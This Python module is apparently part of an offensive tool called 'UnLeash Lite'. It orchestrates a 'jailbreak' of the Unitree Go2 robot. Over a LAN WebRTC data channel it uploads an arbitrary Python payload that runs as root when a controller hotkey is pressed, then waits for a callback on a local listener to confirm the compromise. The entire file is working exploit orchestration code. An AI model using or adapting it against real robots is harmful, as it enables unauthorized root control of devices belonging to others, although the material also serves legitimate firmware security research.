"""
WebRTC jailbreak orchestrator for Unitree Go2.

Uploads Python payloads via the WebRTC data channel to programming_actuator,
bound to a controller hotkey. Execution happens when the user presses the
hotkey on the physical controller. Requires LAN adjacency only.
"""

import asyncio
import logging

from .webrtc import Go2DataChannel
from .webrtc_payloads import WebRTCPayload

logger = logging.getLogger("unleash_lite.webrtc_jailbreak")

G = "\033[1;32m"; R = "\033[1;31m"; Y = "\033[1;33m"; C = "\033[1;36m"
DIM = "\033[2m"; BOLD = "\033[1m"; RESET = "\033[0m"


class WebRTCJailbreakOrchestrator:

    def __init__(self, robot_ip, payload, callback_ip=None,
                 callback_port=19999, signaling_port=9991,
                 aes_128_key=None):
        self.robot_ip = robot_ip
        self.payload = payload
        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.signaling_port = signaling_port
        self.aes_128_key = aes_128_key

    async def execute(self, wait_for_callback=True, callback_timeout=120.0):
        """Three-phase jailbreak: upload -> instruct -> verify."""
        p = self.payload
        hotkey = p.bind_hotkey

        print()
        print(f"  {C}{'=' * 62}{RESET}")
        print(f"  {C}{BOLD}  UnLeash Lite — WebRTC Jailbreak{RESET}")
        print(f"  {C}  Target: {self.robot_ip}:{self.signaling_port}{RESET}")
        print(f"  {C}  Mode:   {p.name} — {p.description}{RESET}")
        print(f"  {C}  Hotkey: {hotkey}{RESET}")
        print(f"  {C}{'=' * 62}{RESET}")
        print()

        # Phase 1: Connect and upload
        callback_received = asyncio.Event()
        callback_data = []
        server = None

        if self.callback_ip and wait_for_callback:
            async def handle_callback(reader, writer):
                data = await reader.read(8192)
                callback_data.append(data.decode(errors='replace'))
                callback_received.set()
                writer.close()

            try:
                server = await asyncio.start_server(
                    handle_callback, '0.0.0.0', self.callback_port)
                print(f"  {G}[1/5]{RESET} Callback listener on port {self.callback_port}")
            except OSError as e:
                print(f"  {Y}[1/5]{RESET} Callback listener failed ({e}) — skipping verification")
                wait_for_callback = False
        else:
            print(f"  {DIM}[1/5]{RESET} Callback listener skipped")

        dc = Go2DataChannel(self.robot_ip, self.signaling_port,
                            aes_128_key=self.aes_128_key)

        try:
            print(f"  {G}[2/5]{RESET} Connecting via WebRTC data channel...")
            await dc.connect()
            print(f"         {DIM}Connected + validated{RESET}")
        except Exception as e:
            print(f"  {R}[2/5] Connection failed:{RESET} {e}")
            if server:
                server.close()
            return False

        try:
            print(f"  {G}[3/5]{RESET} Uploading payload ({len(p.python_code)} bytes)...")
            status = await dc.upload_program(
                p.python_code, p.program_uuid, hotkey)
            if status == 0:
                print(f"         {DIM}Upload accepted (status 0){RESET}")
            else:
                print(f"  {R}       Upload rejected (status {status}){RESET}")
                await dc.close()
                if server:
                    server.close()
                return False

            print(f"  {G}[4/5]{RESET} Verifying registration...")
            programs = await dc.list_programs()
            registered = any(
                prog.get("program_uuid") == p.program_uuid
                for prog in programs
            )
            if registered:
                print(f"         {DIM}Registered on {hotkey}{RESET}")
            else:
                print(f"  {Y}       Not found in hotkey list (may still work){RESET}")

        except Exception as e:
            print(f"  {R}  Error during upload:{RESET} {e}")
            await dc.close()
            if server:
                server.close()
            return False

        await dc.close()

        # Phase 2: Instruct user
        print()
        print(f"  {G}╔{'═' * 60}╗{RESET}")
        print(f"  {G}║{RESET}  {BOLD}PAYLOAD STAGED{RESET} — "
              f"Press {BOLD}{hotkey}{RESET} on the Go2 controller"
              f"       {G}║{RESET}")
        print(f"  {G}╚{'═' * 60}╝{RESET}")
        print()
        print(f"  {DIM}Written to: /unitree/etc/programming/{p.program_uuid}.py{RESET}")
        print(f"  {DIM}Executes as root when {hotkey} is pressed on the controller.{RESET}")

        # Phase 3: Wait for callback
        if wait_for_callback and self.callback_ip and server:
            print()
            print(f"  {G}[5/5]{RESET} Waiting for callback ({int(callback_timeout)}s)...")
            try:
                await asyncio.wait_for(
                    callback_received.wait(), timeout=callback_timeout)
                print()
                print(f"  {G}{'=' * 62}{RESET}")
                print(f"  {G}{BOLD}  JAILBREAK CONFIRMED{RESET}")
                for line in callback_data:
                    for l in line.strip().split('\n'):
                        print(f"  {G}  {l}{RESET}")
                print(f"  {G}{'=' * 62}{RESET}")
                server.close()
                return True
            except asyncio.TimeoutError:
                print(f"\n  {Y}No callback received.{RESET} "
                      f"Press {BOLD}{hotkey}{RESET} on the controller to execute.")
                server.close()
                return False
        else:
            print(f"\n  {DIM}[5/5] Callback verification skipped{RESET}")
            return True
